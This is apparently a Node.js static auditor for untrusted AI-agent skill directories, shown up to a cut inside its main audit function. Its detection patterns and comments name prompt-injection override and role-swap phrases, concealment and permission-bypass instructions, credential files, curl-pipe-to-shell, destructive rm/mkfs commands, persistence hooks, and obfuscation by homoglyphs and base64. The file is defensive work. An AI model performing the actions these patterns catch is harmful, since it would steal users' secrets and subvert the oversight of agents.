#!/usr/bin/env node
/**
 * audit-skill.mjs — static audit of an UNTRUSTED skill directory.
 *
 *   node audit-skill.mjs <skill-dir> [--json] [--quiet]
 *
 * This reads. It never executes anything from the target, never resolves a
 * symlink out of it, and never makes a network call. That is the whole safety
 * property: auditing a hostile skill must not be the thing that runs it.
 *
 * What it is for. A skill is not a library. A library is code you call; a skill
 * is text that gets loaded into an agent's context and treated as instructions,
 * before any script runs. So the primary attack surface is prose, and the usual
 * dependency-audit instincts look in the wrong place.
 *
 * What it is NOT for. This finds patterns, not intent. `fetch(` in a skill about
 * HTTP is expected; `fetch(` in a skill about renaming files is not, and no
 * regex can tell those apart. Every finding is evidence for a human decision,
 * which is why the output prints the matched text and its location rather than
 * a score. See references/adjudication.md.
 *
 * Deliberately absent: an in-band suppression pragma. A `// audit:allow` comment
 * would be written by whoever wrote the skill — that is, by the attacker in the
 * case this tool exists for. Suppression lives in the audit report, outside the
 * artefact, where the person suppressing it signs their name to it.
 *
 * Known false positive: auditing this skill, or its own references, produces
 * findings. The patterns are the subject matter. That is expected and is not a
 * defect to be silenced.
 *
 * Exit: 0 clean or NOTE only · 1 at least one REVIEW · 2 at least one BLOCK.
 */

import { readdirSync, readFileSync, realpathSync, statSync } from 'node:fs';
import { basename, extname, join, relative } from 'node:path';
import { fileURLToPath } from 'node:url';

// ── colour, which is optional ───────────────────────────────────────────────
//
// Guarded, because promote.test.mjs deploys this scanner by COPYING THIS ONE
// FILE into a skill's scripts/ folder, where commands/tint.mjs is not beside
// it. A static import would make that copy die with ERR_MODULE_NOT_FOUND
// before it audited anything.
//
// The fallback is identity, which is exactly what tint.mjs itself returns on a
// pipe. Severity is carried by the WORD — BLOCK, REVIEW, NOTE — and the ink is
// only a second copy of it, so a report with the colour stripped says the same
// thing. That is the test for whether an ink belongs anywhere in this file.
// `enabled` is here because the real object has it. A fallback that is merely
// good enough for today's call sites breaks the day someone adds one, and it
// breaks ONLY in the copied-alone path — the one that runs on a user's machine
// after promotion and which nothing here executes.
let tint = { state: (t) => t, warn: (t) => t, alarm: (t) => t, dim: (t) => t, enabled: () => false };
try {
  const mod = await import('./tint.mjs');
  tint = mod.tint;
} catch {
  // Deployed alone. Plain text is correct, not a failure.
}

// ── how this was invoked, which is also optional ────────────────────────────
//
// Guarded for the same reason colour is, and it is the same hazard: deployed as
// a single file into a skill's scripts/ folder, invoked-as.mjs is not beside
// this one either. promote.test.mjs copies exactly this script that way.
//
// The fallback is not a degraded mode. A script deployed alone was not reached
// through bin/qrntn.mjs, so QRNTN_VERB is unset and the module would return
// this exact string anyway.
let invokedAs = () => `node ${basename(fileURLToPath(import.meta.url))}`;
try {
  const mod = await import('./invoked-as.mjs');
  invokedAs = () => mod.invokedAs(import.meta.url);
} catch {
  // Deployed alone. Naming the file is correct, not a failure.
}

// ── the flags this verb has ─────────────────────────────────────────────────
//
// Guarded like the two above. Without the sibling an unrecognised flag goes
// back to being ignored, which is what every command did before argv.mjs
// existed; the shipped package always carries it and `files` gates that.
let checkFlags = () => null;
try {
  const mod = await import('./argv.mjs');
  checkFlags = mod.checkFlags;
} catch {
  // Deployed alone. No validation, which is where this started.
}

const FLAGS = {
  boolean: ['--json', '--quiet', '--no-evidence', '--help', '-h'],
  valued: ['--exclude']
};

// ── limits ───────────────────────────────────────────────────────────────────
// The first four mirror the platform's own validator (skill-creator's
// quick_validate.py) so that a skill failing here would also fail there. The
// rest are this repo's house limits and are advisory.
// `disable-model-invocation` was missing from the first version of this list,
// which was taken from skill-creator's quick_validate.py. It is a real and
// supported key — first-party plugins use it — and it means the skill runs only
// when the user invokes it explicitly, never on the model's own initiative.
// Reporting it as an unrecognised key was backwards: it is a voluntary
// restriction on the skill's reach, which is the opposite of a hiding place.
// Three tiers, because "recognised" and "portable" are different questions and
// collapsing them produced the same defect twice — first on
// disable-model-invocation, then on argument-hint. The tiers are the fix for
// the class; adding one more key would only have fixed the instance.
//
// SPEC: the six fields the Agent Skills standard defines. These load in every
// harness and in claude.ai uploads, the Skills API and package_skill.py.
const SPEC_FRONTMATTER_KEYS = new Set([
  'name',
  'description',
  'license',
  'compatibility',
  'metadata',
  'allowed-tools'
]);

// HARNESS: real, documented Claude Code fields. They load here, but any one of
// them makes packaging or upload fail with a hard error rather than an ignored
// field, so a vendored skill carrying one cannot travel to claude.ai. That is a
// portability fact worth reporting and not a hiding place, hence NOTE.
const HARNESS_FRONTMATTER_KEYS = new Set([
  'when_to_use',
  'argument-hint',
  'arguments',
  'disable-model-invocation',
  'user-invocable',
  'disallowed-tools',
  'model',
  'effort',
  'context',
  'agent',
  'background',
  'paths',
  'shell'
]);

// And one that is neither: `hooks:` in frontmatter registers hooks for the rest
// of the session. That is the same capability this audit already blocks a
// hooks.json file for — "a hook executes without the agent ever choosing to
// load the skill" — reached through a different door. Treating it as a merely
// unrecognised key would have graded a hook registration below a hook file.
const HOOK_FRONTMATTER_KEYS = new Set(['hooks']);
const MAX_NAME_LENGTH = 64;
const MAX_DESCRIPTION_LENGTH = 1024;
const NAME_PATTERN = /^[a-z0-9-]+$/;

const MIN_DESCRIPTION_LENGTH = 40;
const MAX_BODY_WORDS = 5000;
const BASE64_MIN_RUN = 40;
const BINARY_SNIFF_BYTES = 8192;
// `__pycache__` was in this set until 2026-09-06 and should not have been. It
// is exactly where the published poisoned-`.pyc` attack lives: source that
// reads clean, beside a compiled artefact nobody opens, which Python prefers
// over the source whenever the timestamps agree. Skipping it made the one
// directory the attack needs the one directory this tool would not look in.
//
// `.git`, `node_modules` and `.venv` stay, because they are not the skill. That
// is a stated limit, not a claim of safety: an artefact hidden in any of them
// is not examined here.
const SKIP_DIRS = new Set(['.git', 'node_modules', '.venv']);

/** A skill's bundled script, invoked by absolute path as the convention requires. */
const BUNDLED_SCRIPT_RE = /\.claude\/skills\/[A-Za-z0-9._-]+\/scripts\//;

/**
 * Lines that read as code rather than prose. Used only to notice that a
 * Markdown file contains code which is NOT inside a fence — see STRUCT-UNFENCEDCODE.
 * Deliberately conservative: a false negative here costs a missed warning, while
 * a false positive fires on ordinary prose and trains the reader to ignore it.
 */
const CODE_SHAPED_RE =
  /^\s*(?:(?:function|const|let|var|import|export|return|class|async|await|def|public|private)\s|@media\b|[.#][A-Za-z][\w-]*\s*\{|[A-Za-z-]{2,}\s*:\s*[^;\n]+;\s*$|\}\s*;?\s*$|[A-Za-z_$][\w$]*\s*\([^)]*\)\s*[{;]\s*$)/;
const UNFENCED_CODE_MIN = 3;

const SEV = { BLOCK: 'BLOCK', REVIEW: 'REVIEW', NOTE: 'NOTE' };
const SEV_RANK = { BLOCK: 0, REVIEW: 1, NOTE: 2 };

// Written as escapes, never as literals. A character class containing the real
// characters would be invisible in this file too — the reviewer of the auditor
// deserves the same legibility the auditor demands of its targets.
//   200B-200F zero width & directional marks · 2060-2064 invisible operators
//   FEFF BOM · 00AD soft hyphen · 180E Mongolian vowel separator
//   2028/2029 line & paragraph separators
const INVISIBLE_RE = /[\u200B-\u200F\u2060-\u2064\uFEFF\u00AD\u180E\u2028\u2029]/g;
//   202A-202E embedding & override · 2066-2069 isolates
const BIDI_RE = /[\u202A-\u202E\u2066-\u2069]/g;

/**
 * Characters that render like an ASCII alphanumeric but are not one.
 *
 * Built from code points rather than written as literals, so this file contains
 * no homoglyphs of its own and a reviewer can check each entry by number.
 *
 * Explicit and finite by choice. The earlier rule — flag any non-ASCII letter
 * inside a code span — fired on every Δ in a colour-maths script and on Greek
 * used as Greek, which is noise, not signal. The cost of the narrower rule is
 * stated plainly: a confusable outside this table is not caught. Widening it is
 * a matter of adding code points, and a skill that trips nothing here has been
 * checked against this list, not cleared in general.
 */
const CONFUSABLES = new Map();
const confusable = (ascii, ...codePoints) => {
  for (const cp of codePoints) CONFUSABLES.set(String.fromCodePoint(cp), ascii);
};
// Cyrillic, Greek and a few Latin/Armenian lookalikes (UTR #39 subset).
confusable('a', 0x0430, 0x03b1, 0x0251);
confusable('c', 0x0441, 0x03f2);
confusable('d', 0x0501);
confusable('e', 0x0435, 0x04bd, 0x212e);
confusable('g', 0x0261);
confusable('h', 0x04bb);
confusable('i', 0x0456, 0x0131, 0x03b9);
confusable('j', 0x0458);
confusable('l', 0x04cf);
confusable('o', 0x043e, 0x03bf, 0x0585);
confusable('p', 0x0440, 0x03c1);
confusable('q', 0x051b);
confusable('s', 0x0455);
confusable('v', 0x03bd, 0x0475);
confusable('w', 0x051d);
confusable('x', 0x0445, 0x03c7);
confusable('y', 0x0443);
confusable('A', 0x0410, 0x0391);
confusable('B', 0x0412, 0x0392);
confusable('C', 0x0421, 0x03f9);
confusable('E', 0x0415, 0x0395);
confusable('H', 0x041d, 0x0397);
confusable('I', 0x0406, 0x0399);
confusable('J', 0x0408);
confusable('K', 0x041a, 0x039a);
confusable('M', 0x041c, 0x039c);
confusable('N', 0x039d);
confusable('O', 0x041e, 0x039f);
confusable('P', 0x0420, 0x03a1);
confusable('S', 0x0405);
confusable('T', 0x0422, 0x03a4);
confusable('X', 0x0425, 0x03a7);
confusable('Y', 0x04ae, 0x03a5);
confusable('Z', 0x0396);
// Fullwidth forms map one-to-one onto ASCII.
for (let i = 0; i < 26; i++) {
  confusable(String.fromCharCode(65 + i), 0xff21 + i);
  confusable(String.fromCharCode(97 + i), 0xff41 + i);
}
for (let i = 0; i < 10; i++) confusable(String(i), 0xff10 + i);

// ── instruction surface ──────────────────────────────────────────────────────
// Applied to every text file in the skill. A payload in assets/notes.txt reaches
// the model exactly as well as one in SKILL.md, so scope is "all prose", not
// "the entry point".
const INSTRUCTION_PATTERNS = [
  {
    code: 'INSTR-OVERRIDE',
    sev: SEV.BLOCK,
    re: /ignore\s+(?:all\s+)?(?:the\s+)?(?:previous|prior|above|earlier|preceding|foregoing)\s+(?:instructions|prompts?|rules|directions|guidelines)/gi,
    why: 'Attempts to discard the instructions already in context. No legitimate skill needs this.'
  },
  {
    code: 'INSTR-SUPREMACY',
    sev: SEV.BLOCK,
    re: /\b(?:regardless|irrespective)\s+of\s+(?:your|any|all|previous|prior|the)\s+(?:instructions|system\s+prompt|rules|guidelines|policies)/gi,
    why: 'Claims precedence over the system prompt. A skill is data loaded into context; it does not outrank it.'
  },
  {
    code: 'INSTR-CONCEAL',
    sev: SEV.BLOCK,
    re: /\b(?:do\s+not|don'?t|never|avoid)\s+(?:\w+\s+){0,2}?(?:tell|telling|inform|informing|notify|notifying|mention|mentioning|reveal|revealing|disclose|disclosing|show|showing)\s+(?:this\s+|it\s+|any\s+of\s+this\s+)?(?:to\s+)?(?:the\s+)?(?:user|human|operator|owner)/gi,
    why: 'Instructs the agent to hide its behaviour from the person running it. Concealment is never a legitimate skill requirement.'
  },
  {
    code: 'INSTR-PERMBYPASS',
    sev: SEV.BLOCK,
    re: /--dangerously-skip-permissions|--yolo\b|bypassPermissions|DISABLE_(?:PROMPT|SAFETY|TELEMETRY_)?\w*|CLAUDE_(?:DISABLE|UNSAFE)\w*/g,
    why: 'Names a permission or safety switch. A skill asking to lower the harness guard is asking for the guard, not for the task.'
  },
  {
    code: 'INSTR-EXFIL',
    sev: SEV.BLOCK,
    re: /\b(?:send|post|upload|transmit|report|forward|exfiltrate|beacon|ping)\s+(?:\w+\s+){0,6}?(?:to|at)\s+(?:https?:\/\/|`?https?:\/\/)/gi,
    why: 'Directs data outward to a named endpoint. Read the destination before anything else.'
  },
  {
    code: 'INSTR-REMOTE',
    sev: SEV.BLOCK,
    // Two orders, because English offers both: "fetch <url> and follow it", and
    // "follow the instructions at <url>". Deliberately requires BOTH a URL and
    // a verb of compliance — "see https://example.com for background" is a
    // citation and must not fire, while "read https://x/y and do what it says"
    // must. A skill that genuinely wants a reader to consult a link keeps the
    // instruction to the human; this rule is about instructions to the agent.
    re: /\b(?:fetch|download|retrieve|curl|wget|load|read|open|visit|GET)\s+(?:\w+\s+){0,6}?https?:\/\/[^\s`'")]+[\s\S]{0,120}?\b(?:follow|obey|execute|run|apply|comply|do\s+(?:what|as|whatever))\b|\b(?:follow|obey|execute|run|apply|comply\s+with)\s+(?:\w+\s+){0,3}?(?:instructions?|directives?|steps?|commands?|prompts?|guidance|whatever)\s+(?:\w+\s+){0,3}?(?:at|from|in|on)\s+`?https?:\/\//gi,
    why: 'Instructs the agent to fetch a remote document and act on what it finds. This is the one channel that defeats a pinned audit by design: the bytes you pinned are innocent, and the instruction they carry is fetched fresh on every run, from a server that can answer differently the second time.'
  },
  {
    code: 'INSTR-SECRETS',
    sev: SEV.REVIEW,
    // The leading lookbehind keeps `.env` from matching inside `process.env`,
    // which otherwise fires on essentially every JavaScript file and trains the
    // reader to skim past the code that matters.
    re: /(?:(?<![A-Za-z0-9_])\.env\b|\.ssh\/|id_rsa\b|id_ed25519\b|\.aws\/credentials|\.netrc\b|ANTHROPIC_API_KEY|OPENAI_API_KEY|GITHUB_TOKEN|AWS_SECRET|\bkeychain\b|credentials\.json|\.npmrc\b)/gi,
    why: 'References a credential store. Legitimate for a secrets-management skill; for anything else, ask what it wants with it.'
  },
  {
    code: 'INSTR-NOCONFIRM',
    sev: SEV.REVIEW,
    re: /\bwithout\s+(?:asking|confirming|confirmation|prompting|permission|informing|checking\s+with|notifying)/gi,
    why: 'Suppresses a confirmation step. Sometimes a genuine ergonomics choice, sometimes the point of the attack.'
  },
  {
    code: 'INSTR-AUTOAPPROVE',
    sev: SEV.REVIEW,
    re: /\b(?:auto[-\s]?approve|always\s+allow|approve\s+(?:all|everything|any)|accept\s+all\s+edits)\b/gi,
    why: 'Asks for blanket approval. Widens the blast radius of every later finding in this skill.'
  },
  {
    code: 'INSTR-AUTHORITY',
    sev: SEV.REVIEW,
    re: /\b(?:system|admin(?:istrator)?|anthropic|developer|root)\s+(?:override|mode|directive|instruction|command)\b/gi,
    why: 'Claims an authority the file does not have. Skill text is never a system message.'
  },
  {
    code: 'INSTR-ROLESWAP',
    sev: SEV.REVIEW,
    re: /\byou\s+are\s+(?:now|actually|really)\s+(?:a|an|the)\s+\w+/gi,
    why: 'Attempts to redefine the agent rather than instruct it. Common opener for a jailbreak.'
  }
];

// ── execution surface ────────────────────────────────────────────────────────
// Applied in full to script files; in Markdown, only inside code spans, because
// prose that says "never run curl | sh" should not read as running it.
const EXECUTION_PATTERNS = [
  {
    code: 'EXEC-PIPESHELL',
    sev: SEV.BLOCK,
    re: /(?:curl|wget)[^\n|]*\|\s*(?:sudo\s+)?(?:ba|z|k|)sh\b/g,
    why: 'Fetches and executes remote code in one step. The fetched content is unreviewable and can differ per request.'
  },
  {
    code: 'EXEC-DESTRUCTIVE',
    sev: SEV.BLOCK,
    re: /\brm\s+-[a-z]*[rf][a-z]*\s|\bshred\b|\bmkfs\b|\bdd\s+if=|>\s*\/dev\/(?:sd|disk)/g,
    why: 'Irreversible data destruction. Must be justified line by line or not shipped.'
  },
  {
    code: 'EXEC-PERSIST',
    sev: SEV.BLOCK,
    re: /\b(?:crontab|launchctl|systemctl|schtasks)\b|\.(?:bashrc|zshrc|bash_profile|profile|zprofile)\b|LaunchAgents|\.claude\/settings/g,
    why: 'Installs something that keeps running after the task ends. A skill should not outlive its invocation.'
  },
  {
    code: 'EXEC-NETWORK',
    sev: SEV.REVIEW,
    re: /\bfetch\s*\(|\bhttps?\.(?:get|request)\s*\(|\bcurl\b|\bwget\b|\burllib\b|\brequests\.(?:get|post|put)|\baxios\b|XMLHttpRequest|\bnc\s+-|\bssh\s+\w/g,
    why: 'Network egress. Check the destination and whether the skill has any reason to leave the machine.'
  },
  {
    code: 'EXEC-EVAL',
    sev: SEV.REVIEW,
    re: /\beval\s*\(|new\s+Function\s*\(|\bexecSync\s*\(|\bspawnSync\s*\(|child_process|\bos\.system\s*\(|\bsubprocess\.|\bpickle\.loads|\bexec\s*\(/g,
    why: 'Executes constructed code. Combined with any network finding, treat as remote code execution.'
  },
  {
    code: 'EXEC-PRIVILEGE',
    sev: SEV.REVIEW,
    re: /\bsudo\b|\bdoas\b|\bchown\b|\bchmod\s+[0-7]*7[0-7]{2}\b|setuid/g,
    why: 'Escalates privilege or widens file permissions.'
  },
  {
    code: 'EXEC-HOMEPATH',
    sev: SEV.REVIEW,
    re: /(?:~\/|\$HOME\b|os\.homedir\s*\(|Path\.home\s*\(|\/etc\/|\/usr\/local\/bin)/g,
    why: 'Reaches outside the skill directory. Reading is usually fine; writing is the question to answer.'
  },
  {
    code: 'EXEC-VCS',
    sev: SEV.REVIEW,
    re: /\bgit\s+(?:push|remote\s+add|config\s+--global)|\bgh\s+(?:pr|release|repo)\s/g,
    why: 'Publishes or reconfigures version control. Outward-facing and hard to reverse.'
  },
  {
    code: 'EXEC-INSTALL',
    sev: SEV.REVIEW,
    re: /\b(?:npm|pnpm|yarn)\s+(?:i|install|add)\b|\bpip3?\s+install\b|\bbrew\s+install\b|\bcargo\s+install\b|\bgo\s+install\b/g,
    why: 'Installs a dependency. Violates the house rule that a skill runs with no install step, and pulls in code nobody audited.'
  }
];

// Files that mean "this is not a bare skill" — a plugin bundle, or a skill
// carrying harness configuration. Out of scope by decision, and loudly so: a
// hook executes without the agent ever choosing to load the skill.
const CONFIG_ARTEFACTS = [
  { match: /^\.?hooks?\.json$/i, why: 'Hook configuration. Hooks run automatically on tool events — outside the agent\'s judgment entirely.' },
  { match: /^\.mcp\.json$/i, why: 'MCP server definition. Adds tools and network endpoints to the session.' },
  { match: /^settings(\.local)?\.json$/i, why: 'Harness settings. Can grant permissions and set environment variables.' },
  { match: /^plugin\.json$/i, why: 'Plugin manifest. This is a plugin bundle, not a skill.' },
  { match: /^package\.json$/i, why: 'Node manifest. Implies a dependency install, and may carry lifecycle scripts that run on install.' },
  { match: /^requirements\.txt$/i, why: 'Python dependency list. Implies an install step.' }
];
const CONFIG_DIRS = new Set(['.claude-plugin', 'hooks', 'commands']);

// `agents/` is two different things wearing one name. In a plugin bundle it
// holds subagent definitions — instructions that can be invoked, out of scope
// for the same reason hooks/ is. Inside a bare skill it is the cross-harness
// convention the Agent Skills standard encourages: agents/<harness>.yaml
// carrying display metadata and that harness's invocation policy.
//
// Keying the block on the directory name alone conflated the two and returned
// DO NOT ADOPT for 36 of 36 skills in a real upstream corpus. A rule that
// blocks everything it sees has stopped discriminating, which is worse than a
// rule that is merely wrong: it reads as diligence.
//
// The discriminator is a SKILL.md at the audited root. With one, this is a
// skill and agents/ is metadata; without one, STRUCT-NOSKILL blocks regardless,
// so the bundle case loses nothing.
const CROSS_HARNESS_DIR = 'agents';

// The house-written record files, at the skill root. `skill-intake` writes
// ORIGIN.md and this skill writes AUDIT.md into `inbox/<name>/`; `promote.mjs`
// carries both into the adopted copy under exactly this pair, which it calls
// RECORD. They travel with the artefact, so every later re-audit reads them
// back in as if they were part of it.
//
// They are the one place where this file's implicit path base is wrong, and the
// one place a file inside the artefact can make a claim ABOUT the artefact. Both
// consequences are handled at the reference graph below; neither is an exemption
// from scanning, and nothing here removes a byte from any other rule.
const RECORD_FILES = new Set(['AUDIT.md', 'ORIGIN.md']);

// ── small utilities ──────────────────────────────────────────────────────────

const isBinary = (buf) => buf.subarray(0, BINARY_SNIFF_BYTES).includes(0);

/**
 * Archive magic numbers, checked before the binary sniff.
 *
 * An archive is the one binary shape that is not merely unreadable — it is a
 * container, and STRUCT-BINARY's question ("confirm it is a genuine asset") is
 * the wrong one to ask of it. A `.docx` is a zip. So is a `.jar`, a `.whl`, an
 * `.xlsx` and an `.epub`. Nothing in this tool opens one, so every rule here has
 * been applied to exactly zero of its contents while the report still reads as
 * a completed scan.
 *
 * Detected by magic number rather than by extension, because the extension is
 * chosen by whoever wrote the payload.
 */
const ARCHIVE_MAGIC = [
  ['zip', [0x50, 0x4b, 0x03, 0x04]],
  ['zip', [0x50, 0x4b, 0x05, 0x06]],
  ['zip', [0x50, 0x4b, 0x07, 0x08]],
  ['gzip', [0x1f, 0x8b]],
  ['bzip2', [0x42, 0x5a, 0x68]],
  ['xz', [0xfd, 0x37, 0x7a, 0x58, 0x5a, 0x00]],
  ['7z', [0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c]],
  ['rar', [0x52, 0x61, 0x72, 0x21, 0x1a, 0x07]],
  ['zstd', [0x28, 0xb5, 0x2f, 0xfd]]
];

function archiveKind(buf) {
  for (const [name, magic] of ARCHIVE_MAGIC) {
    if (buf.length >= magic.length && magic.every((byte, i) => buf[i] === byte)) return name;
  }
  // tar carries no leading magic; its `ustar` marker sits at offset 257.
  if (buf.length > 262 && buf.subarray(257, 262).toString('latin1') === 'ustar') return 'tar';
  return null;
}

/** Line/column for a byte offset, 1-indexed, so findings are clickable. */
function locate(text, index) {
  let line = 1;
  let lineStart = 0;
  for (let i = 0; i < index; i++) {
    if (text.charCodeAt(i) === 10) {
      line++;
      lineStart = i + 1;
    }
  }
  return { line, col: index - lineStart + 1 };
}

/** One line of context, trimmed and elided, so a minified file cannot flood the report. */
function excerpt(text, index, length, max = 100) {
  const raw = text.slice(index, index + Math.min(length, max)).replace(/\s+/g, ' ').trim();
  return raw.length < length ? `${raw}…` : raw;
}

/**
 * A fragment of the artefact quoted into a finding's `why` sentence — a
 * frontmatter key, a referenced path, a directory name.
 *
 * `why` is written by this tool, but nine findings quote the artefact into it,
 * and until this existed those quotes were unbounded: a frontmatter key can be
 * any length and carry any character, and it reached the reader verbatim,
 * outside the cap and the JSON.stringify that evidence goes through
 * (THREATS.md, the evidence channel). Same bound as evidence, then: whitespace
 * collapsed, capped, and anything that is not printable ASCII escaped so a
 * terminal cannot be steered and an invisible character cannot vanish.
 */
function fragment(text, max = 60) {
  const flat = String(text).replace(/\s+/g, ' ').trim();
  const cut = flat.length > max ? `${flat.slice(0, max)}…` : flat;
  return cut.replace(/[^\x20-\x7e…]/g, (ch) => {
    const cp = ch.codePointAt(0);
    return cp > 0xffff ? `\\u{${cp.toString(16)}}` : `\\u${cp.toString(16).padStart(4, '0')}`;
  });
}

function walk(root) {
  const files = [];
  const symlinks = [];
  (function rec(dir) {
    let entries;
    try {
      entries = readdirSync(dir, { withFileTypes: true });
    } catch {
      return;
    }
    for (const e of entries.sort((a, b) => a.name.localeCompare(b.name))) {
      const abs = join(dir, e.name);
      // Checked before isDirectory(), which follows the link and would let a
      // symlinked directory be walked as if it were part of the skill.
      if (e.isSymbolicLink()) {
        symlinks.push(relative(root, abs));
        continue;
      }
      if (e.isDirectory()) {
        if (!SKIP_DIRS.has(e.name)) rec(abs);
        continue;
      }
      if (!e.isFile()) continue;
      files.push({ rel: relative(root, abs), abs, dirName: basename(dir) });
    }
  })(root);
  return { files, symlinks };
}

/**
 * Minimal frontmatter reader — top-level scalars plus nested blocks, no YAML
 * engine. Deliberate: a dependency would break the no-install rule, and
 * frontmatter that needs a full parser to disambiguate is itself a finding.
 */
function parseFrontmatter(text) {
  if (!text.startsWith('---')) return { ok: false, error: 'no frontmatter — file does not open with ---' };
  const end = text.indexOf('\n---', 3);
  if (end === -1) return { ok: false, error: 'frontmatter is not closed by a --- line' };

  const block = text.slice(text.indexOf('\n') + 1, end);
  const keys = new Map();
  const duplicates = [];
  let current = null;

  block.split('\n').forEach((raw, i) => {
    if (!raw.trim() || raw.trim().startsWith('#')) return;
    if (/^\s/.test(raw)) {
      if (current) current.value += ` ${raw.trim()}`;
      return;
    }
    const m = raw.match(/^([A-Za-z0-9_-]+):\s*(.*)$/);
    if (!m) {
      current = null;
      return;
    }
    const [, key, rest] = m;
    if (keys.has(key)) duplicates.push(key);
    let value = rest.trim();
    if ((value.startsWith('"') && value.endsWith('"')) || (value.startsWith("'") && value.endsWith("'"))) {
      value = value.slice(1, -1);
    }
    current = { value, line: i + 2 };
    keys.set(key, current);
  });

  return { ok: true, keys, duplicates, bodyOffset: end + 4 };
}

/** Fenced blocks only — text a reader might plausibly copy and run. */
function fencedSpans(text) {
  const ranges = [];
  for (const m of text.matchAll(/^```[^\n]*\n[\s\S]*?^```/gm)) ranges.push([m.index, m.index + m[0].length]);
  return ranges;
}

/**
 * Fenced blocks plus inline code. Wider than fencedSpans because a homoglyph
 * matters anywhere a character is read as an identifier, including the inline
 * `--flag` citations that execution patterns deliberately skip.
 */
function codeSpans(text) {
  const ranges = fencedSpans(text);
  for (const m of text.matchAll(/`[^`\n]+`/g)) ranges.push([m.index, m.index + m[0].length]);
  return ranges;
}

const inRanges = (i, ranges) => ranges.some(([a, b]) => i >= a && i < b);

/**
 * Match a string against EVERY rule, instruction and execution alike.
 *
 * Feeding a decoded run back through the rule set is, per the published survey,
 * the single behaviour whose absence explains all eight documented bypasses.
 * This tool already did that — but only against INSTRUCTION_PATTERNS, which
 * left the obvious half open: a base64 blob decoding to `curl evil.sh | sh`
 * matched no instruction rule, and was reported at REVIEW as "readable text,
 * decode it and read what it says". The decoding was right and the verdict was
 * wrong.
 *
 * The `g` flag is stripped because these regexes are module-level and stateful:
 * a global regex carries `lastIndex` between calls and would skip matches on
 * every other invocation.
 */
/**
 * Fold a string to its ASCII skeleton before matching.
 *
 * Two mechanisms, because neither is sufficient alone. NFKC collapses Unicode
 * compatibility forms — fullwidth `ｉ`, ligatures, circled and styled letters —
 * and leaves Cyrillic `а` exactly where it was, correctly, because Cyrillic `а`
 * really is a different character. The CONFUSABLES table collapses precisely
 * that second class. Run one without the other and half the obfuscations
 * survive.
 *
 * This is what turns INSTR-HOMOGLYPH from a note about a character into a
 * finding about a sentence. Before folding, a homoglyph inside an override
 * directive produced a REVIEW about one letter and no BLOCK about the
 * instruction that letter was hiding — the scanner saw the disguise and missed
 * what was wearing it.
 */
const foldToAscii = (s) => s.normalize('NFKC').replace(/[^\x00-\x7F]/g, (ch) => CONFUSABLES.get(ch) ?? ch);

const hostileIn = (s) => {
  for (const p of [...INSTRUCTION_PATTERNS, ...EXECUTION_PATTERNS]) {
    if (new RegExp(p.re.source, p.re.flags.replace('g', '')).test(s)) return p;
  }
  return null;
};

const printableRatio = (s) => (s ? s.split('').filter((c) => c >= ' ' && c <= '~').length / s.length : 0);

/** Printable-ASCII ratio, used to decide whether a base64 run decodes to prose. */
function decodeBase64(s) {
  try {
    const out = Buffer.from(s, 'base64').toString('utf8');
    return out && printableRatio(out) > 0.85 ? out : null;
  } catch {
    return null;
  }
}

/**
 * Decode a pure-hex run, or return null if it is a digest rather than an encoding.
 *
 * A SHA-256 is 64 hex characters and a git object id is 40, so both sail past
 * the base64 run-length floor and were being reported as encoded payloads — on
 * every audit record this tool writes, since those records cite hashes by
 * design. Hex is not base64, and the honest separation is to decode it: real
 * hex-encoded text yields printable bytes, a digest yields noise.
 *
 * The check earns its keep in both directions — it removes a guaranteed false
 * positive and adds detection for a payload hidden as raw hex, which nothing
 * else here covers (INSTR-HEXESC only matches escaped `\xNN` sequences).
 */
function decodeHexRun(s) {
  if (s.length % 2 !== 0) return null;
  try {
    const out = Buffer.from(s, 'hex').toString('utf8');
    return out && printableRatio(out) > 0.85 ? out : null;
  } catch {
    return null;
  }
}

/**
 * Is this run a filesystem path rather than an encoded payload?
 *
 * `/` is in the base64 alphabet, so a long absolute path matches the run
 * pattern exactly as a blob does. This is not hypothetical: every ORIGIN.md
 * intake writes carries a Source path, and on a machine whose temp directory
 * is long — macOS gives every user one about forty characters deep — that row
 * was reported as an encoded payload on every audit of a freshly intaken
 * skill.
 *
 * The separation is the same kind decodeHexRun makes, and rests on what the
 * character MEANS in each. Base64 puts a `/` there as data, at one character
 * in sixty-four by construction. A path puts one there as a separator, at
 * roughly one in eight. Density tells them apart without asking what the text
 * says.
 *
 * The floor is one in sixteen: four times what base64 produces, half what a
 * path does. It is not a bypass. Stuffing slashes into a payload to slip under
 * it corrupts the payload — the inserted characters decode as data, and what
 * comes out is no longer the thing that was worth encoding.
 */
function isPathLike(run) {
  const slashes = (run.match(/\//g) ?? []).length;
  return slashes * 16 > run.length;
}

// ── the audit ────────────────────────────────────────────────────────────────

/**
 * Glob → RegExp. `*` matches within a path segment, `**` across segments.
 *
 * A single pass, with no placeholder substitution. The first version swapped
 * `**` for a sentinel and back, and the sentinel it ended up carrying was a
 * literal NUL byte — which made this very file read as binary to grep, and
 * would have been invisible to this tool's own binary sniff, because that only
 * inspects the first 8KB and the byte sat at 19,414. STRUCT-NULBYTE exists
 * because of it.
 */
function globToRe(glob) {
  const SPECIAL = '.+^${}()|[]\\?';
  let body = '';
  for (let i = 0; i < glob.length; i++) {
    const c = glob[i];
    if (c === '*') {
      if (glob[i + 1] === '*') {
        body += '.*';
        i++;
      } else {
        body += '[^/]*';
      }
    } else if (SPECIAL.includes(c)) {
      body += `\\${c}`;
    } else {
      body += c;
    }
  }
  return new RegExp(`^${body}$`);
}

export function auditSkill(root, options = {}) {
  const excludeRes = (options.exclude ?? []).map(globToRe);
  const isExcluded = (rel) => excludeRes.some((re) => re.test(rel) || re.test(basename(rel)));
  const findings = [];
  // `evidence: false` withholds the matched bytes — every finding's evidence is
  // null, and the fragments `why` would quote from the artefact are replaced
  // rather than bounded. Decided here, in the one function that builds
  // findings, so the CLI's --no-evidence cannot withhold one channel and leak
  // through the other. What it cannot withhold is `file`: a location cannot be
  // withheld from a report about a location, and the artefact named its files.
  const withhold = options.evidence === false;
  const quote = (text) => (withhold ? '[withheld]' : fragment(text));
  const add = (sev, code, why, file, loc, evidence) =>
    findings.push({ sev, code, why, file, line: loc?.line ?? null, col: loc?.col ?? null, evidence: withhold ? null : evidence ?? null });

  let stat;
  try {
    stat = statSync(root);
  } catch {
    return { fatal: `not a readable path: ${root}`, findings: [], files: [] };
  }
  if (!stat.isDirectory()) return { fatal: `not a directory: ${root}`, findings: [], files: [] };

  const { files, symlinks } = walk(root);

  // A symlink inside a skill is read as content by whatever loads it. One
  // pointing at ~/.ssh/id_rsa exfiltrates on read, with no script involved.
  for (const s of symlinks) {
